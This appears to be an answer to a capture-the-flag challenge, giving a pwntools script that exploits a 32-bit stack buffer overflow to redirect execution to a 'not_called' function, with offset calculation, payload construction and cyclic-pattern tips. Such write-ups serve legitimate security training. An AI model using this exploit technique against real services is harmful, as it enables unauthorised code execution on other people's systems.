To solve this challenge using pwntools, we'll exploit a buffer overflow vulnerability in the `vulnerable_function` to overwrite the return address and redirect execution to the `not_called` function. The `not_called` function executes `system("/bin/date")`, which we can leverage to execute arbitrary commands or gain a shell depending on the actual challenge. We'll use pwntools to construct and send the payload.

**Imports:**

```python
from pwn import *
```

**Functioning Code:**

```python
from pwn import *

# Set context for correct architecture (32-bit in this case)
context.update(arch='i386', os='linux')

# Load the binary
elf = ELF('chall')  # Replace 'chall' with the actual binary name

# Start the process or connect to the remote service
# p = process(elf.path)  # For local testing
p = remote('host', port)  # Replace 'host' and 'port' with actual values for remote exploit

# Find the address of the 'not_called' function
not_called_addr = elf.symbols['not_called']

# Generate the offset to the return address
# You can adjust this value based on the exact stack layout
offset = 136  # Size of 'buf' array in 'vulnerable_function'
padding = 4    # For saved EBP if present
total_padding = offset + padding

# Construct the payload
payload = flat(
    b'A' * total_padding,  # Overflow buffer and overwrite EBP
    p32(not_called_addr)   # Overwrite return address with 'not_called' function address
)

# Send the payload
p.sendline(payload)

# Receive the output
output = p.recvall()

# Print the output
print(output.decode())

# Close the process or connection
p.close()
```

**Explanation:**

- We import the necessary functions from pwntools.
- We set the context to match the binary's architecture (32-bit Linux in this case).
- We load the ELF binary using `ELF('chall')`. Ensure that the binary is in the same directory or provide the correct path.
- We either start a local process or connect to a remote service. Uncomment the appropriate line depending on where you're testing.
- We retrieve the address of the `not_called` function using `elf.symbols['not_called']`.
- We calculate the total padding needed to reach the return address. This typically includes the size of the buffer and any saved registers like EBP.
- We construct the payload using `flat`, which concatenates the necessary bytes:
  - `'A' * total_padding` to fill the buffer and overwrite saved registers.
  - `p32(not_called_addr)` to overwrite the return address with the address of `not_called`.
- We send the payload to the binary using `p.sendline(payload)`.
- We receive and print the output from the binary.
- Finally, we close the process or connection with `p.close()`.

**Note:**

- Ensure that you have pwntools installed (`pip install pwntools`).
- Replace `'chall'` with the actual filename of the binary.
- If exploiting remotely, replace `'host'` and `'port'` with the actual details.
- If the offset is different, you can use `cyclic` patterns in pwntools to determine the exact offset:
  ```python
  # Generate a cyclic pattern
  payload = cyclic(200)  # Adjust the size as needed

  # Send the payload and cause a crash, then use gdb or similar to find the offset
  # For example, in GDB:
  # gdb-peda$ pattern_offset <eip value>
  ```
- Always test your exploit locally before trying it on a remote service.
